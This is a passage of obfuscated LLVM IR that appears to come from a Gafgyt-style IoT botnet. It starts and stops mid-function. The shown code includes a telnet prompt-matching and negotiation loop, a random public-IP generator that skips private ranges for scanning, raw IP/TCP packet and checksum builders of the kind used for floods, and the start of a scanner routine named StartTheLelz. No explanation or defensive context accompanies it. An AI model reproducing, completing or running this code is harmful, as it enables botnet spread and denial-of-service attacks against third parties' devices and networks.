  %83 = or i64 %80, %81
  %84 = xor i64 %82, %83
  %85 = or i64 %75, %76
  %86 = xor i64 %85, -1
  %87 = or i64 -4990784065860926730, %77
  %88 = and i64 %86, %87
  %89 = or i64 %84, %88
  %90 = or i64 %74, %68
  store i64 %89, i64* %73, align 8
  %91 = load i32, i32* %10, align 4
  %92 = add i32 %91, 162763628
  %93 = add i32 %92, 1
  %94 = sub i32 %93, 162763628
  %95 = add nsw i32 %91, 1
  %96 = call i32 @select(i32 %94, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %97 = icmp slt i32 %96, 1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %64
  br label %165

; <label>:99:                                     ; preds = %64
  %100 = load i8*, i8** %15, align 8
  %101 = load i32, i32* %18, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i8, i8* %100, i64 %102
  store i8* %103, i8** %23, align 8
  %104 = load i32, i32* %10, align 4
  %105 = load i8*, i8** %23, align 8
  %106 = call i64 @recv(i32 %104, i8* %105, i64 1, i32 0)
  %107 = trunc i64 %106 to i32
  store i32 %107, i32* %19, align 4
  %108 = load i32, i32* %19, align 4
  %109 = icmp eq i32 %108, -1
  br i1 %109, label %113, label %110

; <label>:110:                                    ; preds = %99
  %111 = load i32, i32* %19, align 4
  %112 = icmp eq i32 %111, 0
  br i1 %112, label %113, label %114

; <label>:113:                                    ; preds = %110, %99
  store i32 0, i32* %9, align 4
  br label %170

; <label>:114:                                    ; preds = %110
  %115 = load i32, i32* %19, align 4
  %116 = load i32, i32* %18, align 4
  %117 = sub i32 0, %116
  %118 = sub i32 0, %115
  %119 = add i32 %117, %118
  %120 = sub i32 0, %119
  %121 = add nsw i32 %116, %115
  store i32 %120, i32* %18, align 4
  %122 = load i8*, i8** %23, align 8
  %123 = load i8, i8* %122, align 1
  %124 = zext i8 %123 to i32
  %125 = icmp eq i32 %124, 255
  br i1 %125, label %126, label %150

; <label>:126:                                    ; preds = %114
  %127 = load i32, i32* %10, align 4
  %128 = load i8*, i8** %23, align 8
  %129 = getelementptr inbounds i8, i8* %128, i64 1
  %130 = call i64 @recv(i32 %127, i8* %129, i64 2, i32 0)
  %131 = trunc i64 %130 to i32
  store i32 %131, i32* %19, align 4
  %132 = load i32, i32* %19, align 4
  %133 = icmp eq i32 %132, -1
  br i1 %133, label %137, label %134

; <label>:134:                                    ; preds = %126
  %135 = load i32, i32* %19, align 4
  %136 = icmp eq i32 %135, 0
  br i1 %136, label %137, label %138

; <label>:137:                                    ; preds = %134, %126
  store i32 0, i32* %9, align 4
  br label %170

; <label>:138:                                    ; preds = %134
  %139 = load i32, i32* %19, align 4
  %140 = load i32, i32* %18, align 4
  %141 = sub i32 0, %139
  %142 = sub i32 %140, %141
  %143 = add nsw i32 %140, %139
  store i32 %142, i32* %18, align 4
  %144 = load i32, i32* %10, align 4
  %145 = load i8*, i8** %23, align 8
  %146 = call i32 @negotiate(i32 %144, i8* %145, i32 3)
  %147 = icmp ne i32 %146, 0
  br i1 %147, label %149, label %148

; <label>:148:                                    ; preds = %138
  store i32 0, i32* %9, align 4
  br label %170

; <label>:149:                                    ; preds = %138
  br label %164

; <label>:150:                                    ; preds = %114
  %151 = load i8*, i8** %15, align 8
  %152 = load i8*, i8** %11, align 8
  %153 = call i8* @strstr(i8* %151, i8* %152) #10
  %154 = icmp ne i8* %153, null
  br i1 %154, label %162, label %155

; <label>:155:                                    ; preds = %150
  %156 = load i32, i32* %12, align 4
  %157 = icmp ne i32 %156, 0
  br i1 %157, label %158, label %163

; <label>:158:                                    ; preds = %155
  %159 = load i8*, i8** %15, align 8
  %160 = call i32 @matchPrompt(i8* %159)
  %161 = icmp ne i32 %160, 0
  br i1 %161, label %162, label %163

; <label>:162:                                    ; preds = %158, %150
  store i32 1, i32* %20, align 4
  br label %165

; <label>:163:                                    ; preds = %158, %155
  br label %164

; <label>:164:                                    ; preds = %163, %149
  br label %33

; <label>:165:                                    ; preds = %162, %98, %52
  %166 = load i32, i32* %20, align 4
  %167 = icmp ne i32 %166, 0
  br i1 %167, label %168, label %169

; <label>:168:                                    ; preds = %165
  store i32 1, i32* %9, align 4
  br label %170

; <label>:169:                                    ; preds = %165
  store i32 0, i32* %9, align 4
  br label %170

; <label>:170:                                    ; preds = %169, %168, %148, %137, %113
  %171 = load i32, i32* %9, align 4
  ret i32 %171
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [16 x i8], align 16
  %3 = alloca [16 x i8], align 16
  %4 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %5 = zext i8 %4 to i32
  %6 = icmp sgt i32 %5, 0
  br i1 %6, label %7, label %29

; <label>:7:                                      ; preds = %0
  %8 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %9 = zext i8 %8 to i32
  %10 = icmp slt i32 %9, 255
  br i1 %10, label %11, label %29

; <label>:11:                                     ; preds = %7
  %12 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %13 = sub i8 0, 1
  %14 = sub i8 %12, %13
  %15 = add i8 %12, 1
  store i8 %14, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %16 = bitcast [16 x i8]* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* %16, i8 0, i64 16, i32 16, i1 false)
  %17 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %18 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %19 = zext i8 %18 to i32
  %20 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %21 = zext i8 %20 to i32
  %22 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %25 = zext i8 %24 to i32
  %26 = call i32 (i8*, i8*, ...) @szprintf(i8* %17, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.25, i32 0, i32 0), i32 %19, i32 %21, i32 %23, i32 %25)
  %27 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %28 = call i32 @inet_addr(i8* %27) #2
  store i32 %28, i32* %1, align 4
  br label %179

; <label>:29:                                     ; preds = %7, %0
  %30 = call i32 @rand() #2
  %31 = srem i32 %30, 255
  %32 = trunc i32 %31 to i8
  store i8 %32, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %33 = call i32 @rand() #2
  %34 = srem i32 %33, 255
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %36 = call i32 @rand() #2
  %37 = srem i32 %36, 255
  %38 = trunc i32 %37 to i8
  store i8 %38, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  br label %39

; <label>:39:                                     ; preds = %157, %29
  %40 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %41 = zext i8 %40 to i32
  %42 = icmp eq i32 %41, 0
  br i1 %42, label %155, label %43

; <label>:43:                                     ; preds = %39
  %44 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %45 = zext i8 %44 to i32
  %46 = icmp eq i32 %45, 10
  br i1 %46, label %155, label %47

; <label>:47:                                     ; preds = %43
  %48 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 100
  br i1 %50, label %51, label %59

; <label>:51:                                     ; preds = %47
  %52 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %53 = zext i8 %52 to i32
  %54 = icmp sge i32 %53, 64
  br i1 %54, label %55, label %59

; <label>:55:                                     ; preds = %51
  %56 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %57 = zext i8 %56 to i32
  %58 = icmp sle i32 %57, 127
  br i1 %58, label %155, label %59

; <label>:59:                                     ; preds = %55, %51, %47
  %60 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %61 = zext i8 %60 to i32
  %62 = icmp eq i32 %61, 127
  br i1 %62, label %155, label %63

; <label>:63:                                     ; preds = %59
  %64 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 169
  br i1 %66, label %67, label %71

; <label>:67:                                     ; preds = %63
  %68 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %69 = zext i8 %68 to i32
  %70 = icmp eq i32 %69, 254
  br i1 %70, label %155, label %71

; <label>:71:                                     ; preds = %67, %63
  %72 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %73 = zext i8 %72 to i32
  %74 = icmp eq i32 %73, 172
  br i1 %74, label %75, label %83

; <label>:75:                                     ; preds = %71
  %76 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %77 = zext i8 %76 to i32
  %78 = icmp sle i32 %77, 16
  br i1 %78, label %79, label %83

; <label>:79:                                     ; preds = %75
  %80 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %81 = zext i8 %80 to i32
  %82 = icmp sle i32 %81, 31
  br i1 %82, label %155, label %83

; <label>:83:                                     ; preds = %79, %75, %71
  %84 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %85 = zext i8 %84 to i32
  %86 = icmp eq i32 %85, 192
  br i1 %86, label %87, label %95

; <label>:87:                                     ; preds = %83
  %88 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %89 = zext i8 %88 to i32
  %90 = icmp eq i32 %89, 0
  br i1 %90, label %91, label %95

; <label>:91:                                     ; preds = %87
  %92 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %93 = zext i8 %92 to i32
  %94 = icmp eq i32 %93, 2
  br i1 %94, label %155, label %95

; <label>:95:                                     ; preds = %91, %87, %83
  %96 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %97 = zext i8 %96 to i32
  %98 = icmp eq i32 %97, 192
  br i1 %98, label %99, label %107

; <label>:99:                                     ; preds = %95
  %100 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %101 = zext i8 %100 to i32
  %102 = icmp eq i32 %101, 88
  br i1 %102, label %103, label %107

; <label>:103:                                    ; preds = %99
  %104 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %105 = zext i8 %104 to i32
  %106 = icmp eq i32 %105, 99
  br i1 %106, label %155, label %107

; <label>:107:                                    ; preds = %103, %99, %95
  %108 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %109 = zext i8 %108 to i32
  %110 = icmp eq i32 %109, 192
  br i1 %110, label %111, label %115

; <label>:111:                                    ; preds = %107
  %112 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %113 = zext i8 %112 to i32
  %114 = icmp eq i32 %113, 168
  br i1 %114, label %155, label %115

; <label>:115:                                    ; preds = %111, %107
  %116 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 198
  br i1 %118, label %119, label %127

; <label>:119:                                    ; preds = %115
  %120 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %121 = zext i8 %120 to i32
  %122 = icmp eq i32 %121, 18
  br i1 %122, label %155, label %123

; <label>:123:                                    ; preds = %119
  %124 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %125 = zext i8 %124 to i32
  %126 = icmp eq i32 %125, 19
  br i1 %126, label %155, label %127

; <label>:127:                                    ; preds = %123, %115
  %128 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %129 = zext i8 %128 to i32
  %130 = icmp eq i32 %129, 198
  br i1 %130, label %131, label %139

; <label>:131:                                    ; preds = %127
  %132 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %133 = zext i8 %132 to i32
  %134 = icmp eq i32 %133, 51
  br i1 %134, label %135, label %139

; <label>:135:                                    ; preds = %131
  %136 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %137 = zext i8 %136 to i32
  %138 = icmp eq i32 %137, 100
  br i1 %138, label %155, label %139

; <label>:139:                                    ; preds = %135, %131, %127
  %140 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %141 = zext i8 %140 to i32
  %142 = icmp eq i32 %141, 203
  br i1 %142, label %143, label %151

; <label>:143:                                    ; preds = %139
  %144 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %145 = zext i8 %144 to i32
  %146 = icmp eq i32 %145, 0
  br i1 %146, label %147, label %151

; <label>:147:                                    ; preds = %143
  %148 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %149 = zext i8 %148 to i32
  %150 = icmp eq i32 %149, 113
  br i1 %150, label %155, label %151

; <label>:151:                                    ; preds = %147, %143, %139
  %152 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %153 = zext i8 %152 to i32
  %154 = icmp sge i32 %153, 224
  br label %155

; <label>:155:                                    ; preds = %151, %147, %135, %123, %119, %111, %103, %91, %79, %67, %59, %55, %43, %39
  %156 = phi i1 [ true, %147 ], [ true, %135 ], [ true, %123 ], [ true, %119 ], [ true, %111 ], [ true, %103 ], [ true, %91 ], [ true, %79 ], [ true, %67 ], [ true, %59 ], [ true, %55 ], [ true, %43 ], [ true, %39 ], [ %154, %151 ]
  br i1 %156, label %157, label %167

; <label>:157:                                    ; preds = %155
  %158 = call i32 @rand() #2
  %159 = srem i32 %158, 255
  %160 = trunc i32 %159 to i8
  store i8 %160, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %161 = call i32 @rand() #2
  %162 = srem i32 %161, 255
  %163 = trunc i32 %162 to i8
  store i8 %163, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %164 = call i32 @rand() #2
  %165 = srem i32 %164, 255
  %166 = trunc i32 %165 to i8
  store i8 %166, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  br label %39

; <label>:167:                                    ; preds = %155
  %168 = bitcast [16 x i8]* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %168, i8 0, i64 16, i32 16, i1 false)
  %169 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i32 0, i32 0
  %170 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %171 = zext i8 %170 to i32
  %172 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %173 = zext i8 %172 to i32
  %174 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %175 = zext i8 %174 to i32
  %176 = call i32 (i8*, i8*, ...) @szprintf(i8* %169, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.26, i32 0, i32 0), i32 %171, i32 %173, i32 %175)
  %177 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i32 0, i32 0
  %178 = call i32 @inet_addr(i8* %177) #2
  store i32 %178, i32* %1, align 4
  br label %179

; <label>:179:                                    ; preds = %167, %11
  %180 = load i32, i32* %1, align 4
  ret i32 %180
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = xor i32 %6, -1
  %8 = xor i32 %5, %7
  %9 = and i32 %8, %5
  %10 = and i32 %5, %6
  store i32 %9, i32* %3, align 4
  %11 = load i32, i32* %3, align 4
  %12 = call i32 @rand_cmwc()
  %13 = load i32, i32* %2, align 4
  %14 = xor i32 %13, -1
  %15 = and i32 -1, %14
  %16 = xor i32 -1, -1
  %17 = and i32 %13, %16
  %18 = or i32 %15, %17
  %19 = xor i32 %13, -1
  %20 = xor i32 %12, -1
  %21 = xor i32 %18, -1
  %22 = xor i32 -703916550, -1
  %23 = or i32 %20, %21
  %24 = or i32 -703916550, %22
  %25 = xor i32 %23, -1
  %26 = and i32 %25, %24
  %27 = and i32 %12, %18
  %28 = xor i32 %11, -1
  %29 = and i32 %26, %28
  %30 = xor i32 %26, -1
  %31 = and i32 %11, %30
  %32 = or i32 %29, %31
  %33 = xor i32 %11, %26
  ret i32 %32
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %23

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, 4240350173319247900
  %16 = add i64 %15, %13
  %17 = sub i64 %16, 4240350173319247900
  %18 = add i64 %14, %13
  store i64 %17, i64* %5, align 8
  %19 = load i32, i32* %4, align 4
  %20 = sub i32 0, 2
  %21 = add i32 %19, %20
  %22 = sub nsw i32 %19, 2
  store i32 %21, i32* %4, align 4
  br label %6

; <label>:23:                                     ; preds = %6
  %24 = load i32, i32* %4, align 4
  %25 = icmp sgt i32 %24, 0
  br i1 %25, label %26, label %37

; <label>:26:                                     ; preds = %23
  %27 = load i16*, i16** %3, align 8
  %28 = bitcast i16* %27 to i8*
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i64
  %31 = load i64, i64* %5, align 8
  %32 = sub i64 0, %31
  %33 = sub i64 0, %30
  %34 = add i64 %32, %33
  %35 = sub i64 0, %34
  %36 = add i64 %31, %30
  store i64 %35, i64* %5, align 8
  br label %37

; <label>:37:                                     ; preds = %26, %23
  br label %38

; <label>:38:                                     ; preds = %42, %37
  %39 = load i64, i64* %5, align 8
  %40 = lshr i64 %39, 16
  %41 = icmp ne i64 %40, 0
  br i1 %41, label %42, label %54

; <label>:42:                                     ; preds = %38
  %43 = load i64, i64* %5, align 8
  %44 = xor i64 65535, -1
  %45 = xor i64 %43, %44
  %46 = and i64 %45, %43
  %47 = and i64 %43, 65535
  %48 = load i64, i64* %5, align 8
  %49 = lshr i64 %48, 16
  %50 = add i64 %46, -4190209963189437769
  %51 = add i64 %50, %49
  %52 = sub i64 %51, -4190209963189437769
  %53 = add i64 %46, %49
  store i64 %52, i64* %5, align 8
  br label %38

; <label>:54:                                     ; preds = %38
  %55 = load i64, i64* %5, align 8
  %56 = xor i64 %55, -1
  %57 = and i64 1415441127746526437, %56
  %58 = xor i64 1415441127746526437, -1
  %59 = and i64 %55, %58
  %60 = xor i64 -1, -1
  %61 = and i64 %60, 1415441127746526437
  %62 = and i64 -1, %58
  %63 = or i64 %57, %59
  %64 = or i64 %61, %62
  %65 = xor i64 %63, %64
  %66 = xor i64 %55, -1
  %67 = trunc i64 %65 to i16
  ret i16 %67
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #2
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #2
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = xor i8 %13, -1
  %15 = xor i8 -16, -1
  %16 = xor i8 71, -1
  %17 = or i8 %14, %15
  %18 = or i8 71, %16
  %19 = xor i8 %17, -1
  %20 = and i8 %19, %18
  %21 = and i8 %13, -16
  %22 = and i8 %20, 5
  %23 = xor i8 %20, 5
  %24 = or i8 %22, %23
  %25 = or i8 %20, 5
  store i8 %24, i8* %12, align 4
  %26 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %27 = bitcast %struct.iphdr* %26 to i8*
  %28 = load i8, i8* %27, align 4
  %29 = xor i8 %28, -1
  %30 = xor i8 15, -1
  %31 = xor i8 -68, -1
  %32 = or i8 %29, %30
  %33 = or i8 -68, %31
  %34 = xor i8 %32, -1
  %35 = and i8 %34, %33
  %36 = and i8 %28, 15
  %37 = and i8 %35, 64
  %38 = xor i8 %35, 64
  %39 = or i8 %37, %38
  %40 = or i8 %35, 64
  store i8 %39, i8* %27, align 4
  %41 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %42 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %41, i32 0, i32 1
  store i8 0, i8* %42, align 1
  %43 = load i32, i32* %10, align 4
  %44 = sext i32 %43 to i64
  %45 = sub i64 0, 20
  %46 = sub i64 0, %44
  %47 = add i64 %45, %46
  %48 = sub i64 0, %47
  %49 = add i64 20, %44
  %50 = trunc i64 %48 to i16
  %51 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %52 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %51, i32 0, i32 2
  store i16 %50, i16* %52, align 2
  %53 = call i32 @rand_cmwc()
  %54 = trunc i32 %53 to i16
  %55 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %56 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %55, i32 0, i32 3
  store i16 %54, i16* %56, align 4
  %57 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %58 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %57, i32 0, i32 4
  store i16 0, i16* %58, align 2
  %59 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %60 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %59, i32 0, i32 5
  store i8 -1, i8* %60, align 4
  %61 = load i8, i8* %9, align 1
  %62 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %63 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %62, i32 0, i32 6
  store i8 %61, i8* %63, align 1
  %64 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %65 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %64, i32 0, i32 7
  store i16 0, i16* %65, align 2
  %66 = load i32, i32* %8, align 4
  %67 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %68 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %67, i32 0, i32 8
  store i32 %66, i32* %68, align 4
  %69 = load i32, i32* %7, align 4
  %70 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %71 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %70, i32 0, i32 9
  store i32 %69, i32* %71, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define void @StartTheLelz() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i8*, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = call i32 @getdtablesize() #2
  %15 = sdiv i32 %14, 4
  %16 = mul nsw i32 %15, 3
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  %18 = icmp sgt i32 %17, 512
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %0
  br label %22

; <label>:20:                                     ; preds = %0
